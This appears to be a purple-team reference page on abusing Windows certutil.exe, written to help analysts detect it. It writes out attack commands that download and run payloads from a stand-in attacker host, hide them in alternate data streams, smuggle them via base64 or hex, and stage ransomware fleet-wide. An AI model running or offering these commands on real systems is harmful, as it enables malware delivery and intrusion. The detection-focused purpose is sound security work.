# LOLBins — certutil.exe — Hands-On Use Cases

Every scenario below runs entirely inside the single `certutil.exe` process documented in `01 - Overview.md` §How It Works — no child process, no service, no dropped-binary Prefetch entry unique to a tool name. What changes per scenario is which verb is used, whether the traffic is network-facing, and how the technique is chained with the rest of an intrusion. MITRE ATT&CK ID(s) are tagged per scenario.

## Contents
- [Downloading a Payload via -urlcache](#downloading-a-payload-via--urlcache)
- [Downloading via -verifyctl as an Alternate Downloader](#downloading-via--verifyctl-as-an-alternate-downloader)
- [GUI-Driven Download via -URL](#gui-driven-download-via--url)
- [Downloading Into an Alternate Data Stream](#downloading-into-an-alternate-data-stream)
- [Base64-Encoding a Payload for Smuggling](#base64-encoding-a-payload-for-smuggling)
- [Base64-Decoding a Smuggled Payload](#base64-decoding-a-smuggled-payload)
- [Hex Encode/Decode Variant](#hex-encodedecode-variant)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)
- [Chained Download-Then-Execute One-Liner](#chained-download-then-execute-one-liner)
- [Staging a Secondary C2 Payload Post-Foothold](#staging-a-secondary-c2-payload-post-foothold)
- [Fleet-Wide Mass Staging](#fleet-wide-mass-staging)
- [Legitimate-Baseline Contrast](#legitimate-baseline-contrast)

---

## Downloading a Payload via -urlcache

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```cmd
certutil.exe -urlcache -split -f http://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
```

The canonical certutil-as-downloader one-liner, and the exact syntax documented by the LOLBAS Project. `-f` forces the fetch (bypassing any stale cache entry); `-split` is present in nearly every published example of this technique but, per Microsoft's own switch reference, its documented purpose is "split embedded ASN.1 elements, and save to files" — not download chunking. The output file lands at the specified path **and** a copy of the fetched bytes plus fetch metadata is written to `%LOCALAPPDATA%Low\Microsoft\CryptnetUrlCache\` regardless — see `04 - Target Evidence.md`.

## Downloading via -verifyctl as an Alternate Downloader

**MITRE ATT&CK:** T1105

```cmd
certutil.exe -verifyctl -f http://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
```

A less commonly recognized variant — `-verifyctl` is officially a Certificate Trust List verification verb (its normal targets are the AuthRoot/Disallowed/PinRules CTLs published via Windows Update), but per the LOLBAS catalog, pointing it at an arbitrary URL with `-f` fetches and saves it the same way `-urlcache` does. An analyst hunting only for `-urlcache` in command-line telemetry misses this. If no output path is given, the file lands only in the `CryptnetUrlCache\Content\<hash>` cache.

## GUI-Driven Download via -URL

**MITRE ATT&CK:** T1105

```cmd
certutil.exe -URL http://198.51.100.7/beacon.exe
```

Windows 10/11 only. Opens the "CertUtil URL Retrieval Tool" GUI dialog — the retrieval status displayed in the dialog reads "Failed," which is misleading: the content is fetched and cached to `CryptnetUrlCache\Content\<hash>` regardless of what the dialog reports. Interactive by nature, so this variant is rare in unattended/scripted attack chains and more plausible where an operator has hands-on-keyboard GUI access (e.g. RDP session) and wants to avoid a raw command-line invocation being logged as prominently.

## Downloading Into an Alternate Data Stream

**MITRE ATT&CK:** T1105, [T1564.004](https://attack.mitre.org/techniques/T1564/004/) (Hide Artifacts: NTFS File Attributes)

```cmd
certutil.exe -urlcache -f http://198.51.100.7/loader.ps1 C:\Users\Public\notes.txt:ttt
```

Writing the fetched content to `<file>:<streamname>` stores it in an NTFS Alternate Data Stream on an otherwise innocuous host file (`notes.txt` here) — a normal `dir`/`Get-ChildItem` listing shows only the host file's own size and content, not the hidden stream. The payload has to be pulled back out of the ADS (e.g. `type C:\Users\Public\notes.txt:ttt`, or read directly by whatever executes it) before it can run.

## Base64-Encoding a Payload for Smuggling

**MITRE ATT&CK:** [T1027.013](https://attack.mitre.org/techniques/T1027/013/) (Obfuscated Files or Information: Encrypted/Encoded File)

```cmd
certutil -encode C:\Users\Public\beacon.exe C:\Users\Public\update.b64
```

Converts the binary to Base64 text — an operator typically runs this **before** the file crosses a monitored boundary (email attachment, web upload, a proxy with file-type inspection), since a `.b64`/`.txt` file that's actually Base64 text routinely passes filters that block or flag a raw `.exe`. The resulting file, if it carries certutil's characteristic PEM-style wrapper (see the caveat in `01 - Overview.md`), can also visually pass a cursory look as an actual certificate.

## Base64-Decoding a Smuggled Payload

**MITRE ATT&CK:** [T1140](https://attack.mitre.org/techniques/T1140/) (Deobfuscate/Decode Files or Information)

```cmd
certutil -decode C:\Users\Public\update.b64 C:\Users\Public\update.exe
```

The reverse step, run on the target once the Base64 blob has already been delivered by whatever means got past perimeter controls (email, a dropped document, a second-stage script). This is the half of the pair analysts see most often in isolation, since the `-encode` step usually happens on infrastructure the defender never has visibility into.

## Hex Encode/Decode Variant

**MITRE ATT&CK:** T1027.013 (encode) / T1140 (decode)

```cmd
certutil -encodehex C:\Users\Public\beacon.exe C:\Users\Public\update.hex
certutil -decodehex C:\Users\Public\update.hex C:\Users\Public\update.exe
```

Functionally identical smuggling logic to the Base64 pair, using hexadecimal instead — a variant worth hunting for separately since a detection rule written only against `-encode`/`-decode` misses it entirely.

## Renamed or Relocated Binary

**MITRE ATT&CK:** [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities), plus whichever download/encode technique it's paired with

```cmd
copy C:\Windows\System32\certutil.exe C:\Users\Public\svchost_update.exe
C:\Users\Public\svchost_update.exe -urlcache -f http://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
```

Copies the legitimate signed binary under a different name and/or path before invoking it, defeating any detection rule keyed purely on `Image` = `certutil.exe` at `System32`/`SysWOW64`. LOLBAS's `Full_Path` listing names exactly those two directories as the only legitimate install locations — a `certutil`-shaped invocation running from anywhere else, under any name, is itself worth flagging (Authenticode/file-hash checks still identify the underlying binary as Microsoft-signed `certutil.exe` even when renamed, since the PE's internal metadata and signature don't change).

## Chained Download-Then-Execute One-Liner

**MITRE ATT&CK:** T1105, [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Command and Scripting Interpreter: Windows Command Shell)

```cmd
certutil.exe -urlcache -f http://198.51.100.7/beacon.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe
```

The download-and-run compound most commonly seen embedded inside another delivery mechanism's own command string — this exact pattern is what `Impacket/smbexec/02 - Hands-On Use Cases.md`'s "Staging a Secondary C2 Payload" scenario uses as its example command, since `smbexec.py` has no built-in file-drop mechanism of its own and has to lean on the target executing a downloader one-liner like this.

## Staging a Secondary C2 Payload Post-Foothold

**MITRE ATT&CK:** T1105, [T1204.002](https://attack.mitre.org/techniques/T1204/002/) (User Execution: Malicious File) where the initial foothold was phishing-delivered

Typical real-world chain: a malicious macro or an `mshta`/`regsvr32`-style initial LOLBIN stage (see [`Windows/Threat Landscape and Playbooks/LOLBIN Abuse Hunting Playbook.md`](<../../../Windows/Threat Landscape and Playbooks/LOLBIN Abuse Hunting Playbook.md>) for those two binaries' own tells) gets code execution, then shells out to `certutil.exe -urlcache -f` to pull down a full-featured C2 agent (Sliver, Empire, Cobalt Strike, etc.) rather than trying to fit that whole payload into the initial delivery vector. `certutil` here is a **stager**, not the payload itself — once the fetched agent runs, the target's evidence trail gains a second, independent layer specific to that C2 framework (cross-link to its own `Purple Teaming/` folder in this repo, e.g. `Sliver/`, `PowerShell Empire/`).

## Fleet-Wide Mass Staging

**MITRE ATT&CK:** T1105

```cmd
:: Issued identically across many already-compromised hosts via C2 tasking,
:: a GPO immediate task, or a lateral-movement tool's command-execution primitive
certutil.exe -urlcache -f http://198.51.100.7/ransomnote_stage2.exe C:\Windows\Temp\upd.exe && C:\Windows\Temp\upd.exe
```

The same download-then-run one-liner, pushed to many hosts near-simultaneously — common in the pre-detonation staging phase of a ransomware intrusion, or any operation needing the same second-stage tool present on every already-compromised host at once. The fleet-level signal is many hosts each independently generating the same certutil argument shape and downloaded-file hash within a tight time window — see the fleet-wide sweep block in `05 - Detection and Hunting.md`.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor this technique has to hide in:

```cmd
certutil -CAInfo
certutil -ping
certutil -store My
```

A CA administrator querying CA health/config, or inspecting a local certificate store, generates `certutil.exe` process-creation events too — but the command line targets a known internal CA name or a certificate-store name, never an Internet URL or an arbitrary `InFile`/`OutFile` pair unrelated to certificates. This is the baseline a `-urlcache`/`-decode`-style hunt has to distinguish itself from; see the Hunting Priority table in `05 - Detection and Hunting.md`.
